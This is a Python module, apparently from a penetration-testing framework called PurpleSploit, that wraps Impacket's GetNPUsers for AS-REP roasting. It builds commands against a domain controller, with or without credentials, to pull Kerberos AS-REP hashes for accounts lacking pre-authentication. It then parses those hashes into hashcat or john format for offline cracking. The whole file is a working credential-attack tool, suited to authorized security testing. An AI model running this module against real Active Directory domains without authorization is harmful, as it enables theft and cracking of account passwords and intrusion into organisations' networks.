"""
Impacket GetNPUsers Module (AS-REP Roasting)

Extract AS-REP hashes from accounts with 'Do not require Kerberos preauthentication' set.
"""

from purplesploit.core.module import ExternalToolModule


class ImpacketASREPRoastModule(ExternalToolModule):
    """
    Impacket GetNPUsers - AS-REP Roasting attack.

    Extracts AS-REP hashes from accounts that don't require Kerberos
    pre-authentication. These hashes can be cracked offline.
    """

    def __init__(self, framework):
        super().__init__(framework)
        self.tool_name = "impacket-GetNPUsers"

    @property
    def name(self) -> str:
        return "Impacket AS-REP Roast (GetNPUsers)"

    @property
    def description(self) -> str:
        return "Extract AS-REP hashes from accounts without Kerberos pre-authentication"

    @property
    def author(self) -> str:
        return "PurpleSploit Team"

    @property
    def category(self) -> str:
        return "impacket"

    def _init_options(self):
        """Initialize module-specific options."""
        super()._init_options()

        self.options.update({
            "RHOST": {
                "value": None,
                "required": True,
                "description": "Target Domain Controller IP",
                "default": None
            },
            "DOMAIN": {
                "value": None,
                "required": True,
                "description": "Domain name (e.g., CORP.LOCAL)",
                "default": None
            },
            "USERNAME": {
                "value": None,
                "required": False,
                "description": "Username (leave empty to query all users)",
                "default": None
            },
            "USERFILE": {
                "value": None,
                "required": False,
                "description": "File with usernames to test",
                "default": None
            },
            "PASSWORD": {
                "value": None,
                "required": False,
                "description": "Password for authenticated enumeration",
                "default": None
            },
            "HASH": {
                "value": None,
                "required": False,
                "description": "NTLM hash for authenticated enumeration",
                "default": None
            },
            "OUTPUT_FILE": {
                "value": None,
                "required": False,
                "description": "Output file for hashes",
                "default": None
            },
            "FORMAT": {
                "value": "hashcat",
                "required": False,
                "description": "Output format (hashcat or john)",
                "default": "hashcat"
            },
            "DC_IP": {
                "value": None,
                "required": False,
                "description": "Domain Controller IP (if different from RHOST)",
                "default": None
            }
        })

    def build_command(self) -> str:
        """
        Build the impacket-GetNPUsers command.

        Returns:
            Command string to execute
        """
        rhost = self.get_option("RHOST")
        domain = self.get_option("DOMAIN")
        username = self.get_option("USERNAME")
        userfile = self.get_option("USERFILE")
        password = self.get_option("PASSWORD")
        hash_val = self.get_option("HASH")
        output_file = self.get_option("OUTPUT_FILE")
        format_type = self.get_option("FORMAT")
        dc_ip = self.get_option("DC_IP")

        # Base command with domain
        cmd = f"impacket-GetNPUsers {domain}/"

        # If we have creds, use them for authenticated enumeration
        if username and (password or hash_val):
            if hash_val:
                cmd += f"{username} -hashes {hash_val}"
            else:
                cmd += f"{username}:{password}"
        elif userfile:
            # Test specific users from file
            cmd += f" -usersfile {userfile} -no-pass"
        else:
            # Unauthenticated enumeration
            cmd += " -no-pass"

        # DC IP
        dc = dc_ip if dc_ip else rhost
        if dc:
            cmd += f" -dc-ip {dc}"

        # Output format
        if format_type:
            cmd += f" -format {format_type}"

        # Output file
        if output_file:
            cmd += f" -outputfile {output_file}"

        return cmd

    def parse_output(self, output: str) -> dict:
        """
        Parse GetNPUsers output.

        Args:
            output: Command stdout

        Returns:
            Parsed results dictionary
        """
        results = {
            "success": False,
            "vulnerable_accounts": [],
            "hashes": [],
            "total_hashes": 0,
        }

        # Parse output
        for line in output.split('\n'):
            line = line.strip()

            # Parse AS-REP hashes
            if "$krb5asrep$" in line:
                results["hashes"].append(line)
                results["total_hashes"] += 1
                results["success"] = True

                # Extract username from hash
                parts = line.split("$")
                if len(parts) > 3:
                    username = parts[3].split("@")[0]
                    results["vulnerable_accounts"].append(username)

            # Check for no vulnerable accounts
            if "No entries found" in line or "No users found" in line:
                results["success"] = True

        return results
